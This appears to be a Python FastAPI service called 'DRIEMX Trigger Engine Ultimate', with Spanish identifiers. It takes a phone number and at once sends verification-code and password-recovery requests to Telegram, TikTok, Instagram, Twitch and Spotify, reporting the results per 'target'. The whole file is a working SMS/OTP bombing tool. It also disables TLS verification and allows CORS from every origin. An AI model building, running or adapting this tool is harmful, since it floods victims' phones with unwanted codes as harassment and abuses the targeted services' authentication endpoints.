from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio

app = FastAPI(title="DRIEMX Trigger Engine Ultimate", version="4.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

ENDPOINTS_MASIVOS = [
    {
        "nombre": "Telegram",
        "url": "https://my.telegram.org/auth/send_password",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://my.telegram.org",
            "Referer": "https://my.telegram.org/auth"
        },
        "payload_func": lambda phone: {"phone": phone}
    },
    {
        "nombre": "TikTok",
        "url": "https://www.tiktok.com/passport/web/send_code/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Referer": "https://www.tiktok.com/"
        },
        "payload_func": lambda phone: {"mobile": phone, "type": 1, "aid": 1988}
    },
    {
        "nombre": "Instagram",
        "url": "https://www.instagram.com/accounts/account_recovery_send_ajax/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/password/reset/"
        },
        "payload_func": lambda phone: {"email_or_username": phone}
    },
    {
        "nombre": "Twitch",
        "url": "https://passport.twitch.tv/register",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Referer": "https://www.twitch.tv/"
        },
        "payload_func": lambda phone: {"phone_number": phone, "client_id": "kimne78kx3ncx6brgo4mv6wbc5h1ku"}
    },
    {
        "nombre": "Spotify",
        "url": "https://spclient.wg.spotify.com/signup/public/v1/account",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.spotify.com/"
        },
        "payload_func": lambda phone: {"phone": phone, "platform": "android"}
    }
]

async def ejecutar_peticion(client, objetivo, telefono):
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "es-ES,es;q=0.9"
    }
    headers = {**default_headers, **objetivo.get("headers", {})}
    payload = objetivo["payload_func"](telefono)

    try:
        if objetivo["method"] == "POST":
            if "application/json" in headers.get("Content-Type", ""):
                response = await client.post(objetivo["url"], json=payload, headers=headers, timeout=8.0)
            else:
                response = await client.post(objetivo["url"], data=payload, headers=headers, timeout=8.0)
        else:
            response = await client.get(objetivo["url"], params=payload, headers=headers, timeout=8.0)
        
        return {
            "servicio": objetivo["nombre"],
            "status_code": response.status_code,
            "respuesta": response.text[:150]
        }
    except Exception as e:
        return {
            "servicio": objetivo["nombre"],
            "status_code": 0,
            "error": str(e)
        }

@app.get("/")
def estado_sistema():
    return {"status": "Online", "engine": "DRIEMX-Trigger-Ultimate"}

@app.get("/trigger/otp")
async def disparar_flujo(phone: str):
    if not phone or len(phone) < 8:
        raise HTTPException(status_code=400, detail="Número de teléfono inválido")

    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        tareas = [ejecutar_peticion(client, obj, phone) for obj in ENDPOINTS_MASIVOS]
        resultados = await asyncio.gather(*tareas)

    return {
        "target": phone,
        "total_peticiones": len(resultados),
        "resultados": resultados
    }
    
